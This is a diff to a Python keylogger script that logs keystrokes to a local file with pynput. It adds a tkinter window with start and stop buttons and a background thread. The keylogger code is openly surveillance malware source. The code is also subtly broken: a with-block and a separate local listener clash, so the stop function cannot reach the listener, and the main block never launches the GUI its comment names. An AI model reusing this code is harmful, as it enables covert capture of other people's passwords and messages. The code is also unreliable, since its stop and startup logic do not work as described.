@@ -1,5 +1,9 @@
-import string, pynput
+import string
+import tkinter as tk
+import threading
 from pynput.keyboard import Key, Listener
+
+listener = None
 
 # File to log the keys
 log_file = "log.txt"
@@ -66,17 +70,52 @@ def on_release(key: string):
         return False # If ret is false the program will close
 
 # Main function to start the keylogger
-def start():
+def start_keylogger():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         """
+        Starts the keylogger on a different thread, different from the GUI.
         The key presses and releases trigger specific callback functions. 
-            The listener runs in the background and monitors the keyboard events for input.
+        The listener runs in the background and monitors the keyboard events for input.
 
         Args:
             on_press (function): A callback function that is called when a key is pressed.
             on_release (function): A callback function that is called when a key is released.
         """
-        listener.join()
+        print("Starting keylogger...")
+        listener = Listener(on_press=on_press, on_release=on_release)
+        listener.start()
+
+def start_keylogger_thread():
+    """Runs the keylogger in a thread to keep the GUI responsive."""
+    keylogger_thread = threading.Thread(target=start_keylogger)
+    keylogger_thread.daemon = True
+    keylogger_thread.start()
+
+def stop_keylogger():
+    """Stops the keylogger."""
+    global listener
+    if listener is not None:
+        listener.stop()
+        listener = None
+        print("Keylogger stopped.")
+
+
+# GUI Setup
+def create_gui():
+    """Creates the tkinter GUI with start/stop buttons."""
+    window = tk.Tk()
+    window.title("Keylogger Control")
+    window.geometry("300x150")
+
+    start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger_thread, width=20)
+    start_button.pack(pady=10)
+
+    stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger, width=20)
+    stop_button.pack(pady=10)
+
+    window.mainloop()
+
 
 if __name__ == "__main__":
-    start()
+    clear_file()  # Clears the log file at the start
+    start_keylogger() # Start the GUI
